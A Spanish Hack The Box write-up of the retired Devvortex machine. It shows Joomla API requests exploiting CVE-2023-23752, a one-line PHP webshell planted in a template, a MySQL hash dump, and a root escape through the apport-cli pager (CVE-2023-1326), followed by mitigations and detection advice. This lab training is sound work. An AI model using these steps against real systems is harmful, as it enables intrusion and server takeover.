---
machine: Devvortex
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, joomla, cve-2023-23752, mysql, apport]
---

# Devvortex — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags, hashes ni credenciales reales.

## TL;DR

El vhost `dev.devvortex.htb` ejecuta Joomla 4.2.6, vulnerable a CVE-2023-23752. La API REST pública filtra usuarios y la contraseña de la base de datos. Con la cuenta de superusuario se edita una plantilla PHP para obtener RCE, se enumeran los usuarios de MySQL y se crackea el hash de `logan`. La escalada final abusa de `apport-cli` (CVE-2023-1326) para escapar del paginador.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

El dominio principal es `devvortex.htb`. Se enumeran subdominios:

```bash
ffuf -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Aparece `dev.devvortex.htb`, un Joomla. La versión se confirma en `/administrator/manifests/files/joomla.xml`: 4.2.6.

## Acceso inicial

CVE-2023-23752 permite consultar la API sin autenticación:

```bash
curl -s 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq
curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
```

Se obtienen usuarios y la contraseña de MySQL. La cuenta `lewis` es Super User y reutiliza esa contraseña en `/administrator`. Desde el panel se edita una plantilla (`error.php` o similar) y se añade un webshell PHP:

```php
<?php system($_GET['c']); ?>
```

Se ejecuta con:

```bash
curl 'http://dev.devvortex.htb/templates/<TEMPLATE>/error.php?c=id'
```

## Movimiento lateral

Con la contraseña de MySQL se enumeran las tablas de Joomla:

```bash
mysql -u <DB_USER> -p'<DB_PASS>' -h localhost joomla
```

```sql
SELECT username, password FROM <PREFIX>_users;
```

El hash de `logan` se crackea con hashcat/john. Se reutiliza la contraseña por SSH:

```bash
ssh logan@<IP>
```

## Escalada a root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/apport-cli
```

CVE-2023-1326 permite escapar del paginador de `apport-cli`:

```bash
sudo apport-cli -c /var/crash/<FILE>.crash
```

En el paginador se ejecuta `!bash` y se obtiene root. Se lee la flag y se redacta.

## Evidencia

- Salida de la API con usuarios y contraseña redactados.
- Webshell y `id`.
- Consulta a `#__users` con hashes redactados.
- `sudo -l` y shell root desde el paginador.

## Lecciones aprendidas

- La API pública de Joomla puede filtrar configuración crítica.
- Reutilizar la contraseña de la base de datos en el panel es un riesgo directo.
- Editar plantillas es una vía de RCE habitual en CMS.
- `apport-cli` con sudo y paginador permite escapar a shell.

## Mitigación y detección

- Actualizar Joomla a una versión corregida.
- Restringir la API REST y revisar `public=true`.
- No reutilizar credenciales entre base de datos y panel.
- Limitar `sudo apport-cli` y el uso de paginadores interactivos.
- Detectar peticiones a `/api/index.php/v1/` y ediciones de plantillas.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2023-23752>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-1326>
- <https://www.hackthebox.com/machines/devvortex>
